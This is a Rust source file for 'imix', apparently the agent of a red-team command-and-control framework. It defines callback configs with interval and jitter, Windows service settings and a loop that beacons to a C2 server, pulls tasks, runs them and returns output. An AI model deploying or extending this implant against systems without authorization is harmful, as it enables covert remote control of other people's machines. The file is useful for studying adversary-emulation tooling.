use crate::exec::AsyncTask;
use crate::init::agent_init;
use crate::tasks::{start_new_tasks, submit_task_output};
use anyhow::Result;
use c2::pb::c2_client::C2Client;
use c2::pb::TaskOutput;
use clap::{arg, Command};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::ffi::OsString;
use std::sync::{Arc, Mutex};
use std::time::Instant;

pub mod exec;
pub mod init;
pub mod install;
pub mod tasks;
#[cfg(feature = "win_service")]
pub mod win_service;

#[derive(Debug)]
pub enum Error {
    Io(std::io::Error),
    SerdeJson(serde_json::Error),
}

impl From<std::io::Error> for Error {
    fn from(error: std::io::Error) -> Self {
        Error::Io(error)
    }
}

impl From<serde_json::Error> for Error {
    fn from(error: serde_json::Error) -> Self {
        Error::SerdeJson(error)
    }
}

#[derive(Serialize, Deserialize, Clone)]
pub struct C2Config {
    pub uri: String,
    pub priority: u8,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct ServiceConfig {
    name: String,
    description: String,
    executable_name: String,
    executable_args: String,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct CallbackConfig {
    pub interval: u64,
    pub jitter: u64,
    pub timeout: u64,
    pub c2_configs: Vec<C2Config>,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Config {
    pub target_name: String,
    pub target_forward_connect_ip: String,
    pub callback_config: CallbackConfig,
    pub service_configs: Vec<ServiceConfig>,
}

pub type TaskID = i64;

fn get_callback_uri(imix_config: Config) -> Result<String> {
    Ok(imix_config.callback_config.c2_configs[0].uri.clone())
}

pub fn standard_main(arguments: Option<Vec<OsString>>) -> Result<()> {
    let cmd = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false),
        )
        .subcommand(
            Command::new("install").about("Run in install mode").arg(
                arg!(
                    -c --config <FILE> "Sets a custom config file"
                )
                .required(true),
            ),
        );
    // .get_matches();
    let matches = match arguments {
        Some(local_arguments) => cmd.try_get_matches_from(local_arguments)?,
        None => cmd.get_matches(),
    };

    match matches.subcommand() {
        Some(("install", args)) => {
            let _config_path = args.value_of("config").unwrap();
            unimplemented!("Install isn't implemented yet")
        }
        _ => {}
    }

    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(128)
        .enable_all()
        .build()
        .unwrap();

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string(), None)) {
            Ok(_) => {}
            Err(error) => eprintln!(
                "Imix main_loop exited unexpectedly with config: {}\n{}",
                config_path.to_string(),
                error
            ),
        }
    } else {
    }
    Ok(())
}

fn do_delay(interval: u64, loop_start_time: Instant) {
    let time_to_sleep = interval
        .checked_sub(loop_start_time.elapsed().as_secs())
        .unwrap_or_else(|| 0);

    #[cfg(debug_assertions)]
    eprintln!(
        "[{}]: Callback failed sleeping seconds {}",
        (Instant::now() - loop_start_time).as_millis(),
        time_to_sleep
    );

    std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601));
}

// Async handler for port scanning.
// Async handler for port scanning.
async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
    #[cfg(debug_assertions)]
    let mut debug_loop_count: i32 = 0;

    // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
    // AKA Work queue
    let mut all_exec_futures: Arc<Mutex<HashMap<TaskID, AsyncTask>>> =
        Arc::new(Mutex::new(HashMap::new()));
    // This hashmap tracks all tasks output
    // AKA Results queue
    let mut all_task_res_map: HashMap<TaskID, Vec<TaskOutput>> = HashMap::new();

    let host_id_file = if cfg!(target_os = "windows") {
        "C:\\ProgramData\\system-id"
    } else {
        "/etc/system-id"
    }
    .to_string();

    let (agent_properties, imix_config) = agent_init(config_path, host_id_file)?;

    loop {
        // 0. Get loop start time
        let loop_start_time = Instant::now();

        #[cfg(debug_assertions)]
        eprintln!("Get new tasks");

        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = get_callback_uri(imix_config.clone())?;

        // 1b) Setup the tavern client
        let tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
            Ok(tavern_client_local) => tavern_client_local,
            Err(err) => {
                #[cfg(debug_assertions)]
                eprintln!("failed to create tavern client {}", err);
                do_delay(imix_config.callback_config.interval, loop_start_time);
                continue;
            }
        };

        // 1c) Collect new tasks
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: collecting tasks",
            (Instant::now() - loop_start_time).as_millis()
        );

        let new_tasks = match tasks::get_new_tasks(
            agent_properties.clone(),
            imix_config.clone(),
            tavern_client.clone(),
        )
        .await
        {
            Ok(local_new_tasks) => local_new_tasks,
            Err(local_err) => {
                #[cfg(debug_assertions)]
                eprintln!(
                    "[{}]: Error getting new tasks {}",
                    (Instant::now() - loop_start_time).as_millis(),
                    local_err
                );
                do_delay(imix_config.callback_config.interval, loop_start_time);
                continue;
            }
        };

        // 2. Start new tasks
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Starting {} new tasks",
            (Instant::now() - loop_start_time).as_millis(),
            new_tasks.len()
        );

        match start_new_tasks(new_tasks, all_exec_futures.clone(), loop_start_time).await {
            Ok(_is_ok) => {}
            Err(local_err) => {
                #[cfg(debug_assertions)]
                eprintln!(
                    "[{}]: Failed to start new tasks: {}",
                    (Instant::now() - loop_start_time).as_millis(),
                    local_err
                );
            }
        };

        // 3. Sleep till callback time
        let time_to_sleep = imix_config
            .clone()
            .callback_config
            .interval
            .checked_sub(loop_start_time.elapsed().as_secs())
            .unwrap_or_else(|| 0);

        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Sleeping seconds {}",
            (Instant::now() - loop_start_time).as_millis(),
            time_to_sleep
        );

        std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.

        // Check status & send response
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Checking task status",
            (Instant::now() - loop_start_time).as_millis()
        );

        // Update running tasks and results
        match submit_task_output(
            loop_start_time,
            tavern_client,
            all_exec_futures.clone(),
            &mut all_task_res_map,
        )
        .await
        {
            Ok(_is_ok) => {}
            Err(local_err) => {
                #[cfg(debug_assertions)]
                eprintln!(
                    "[{}]: Error submitting task results {}",
                    (Instant::now() - loop_start_time).as_millis(),
                    local_err
                );
                do_delay(imix_config.callback_config.interval, loop_start_time);
            }
        };

        // Debug loop tracker
        #[cfg(debug_assertions)]
        if let Some(count_max) = loop_count_max {
            debug_loop_count += 1;
            if debug_loop_count >= count_max {
                return Ok(());
            }
        }
    }
}
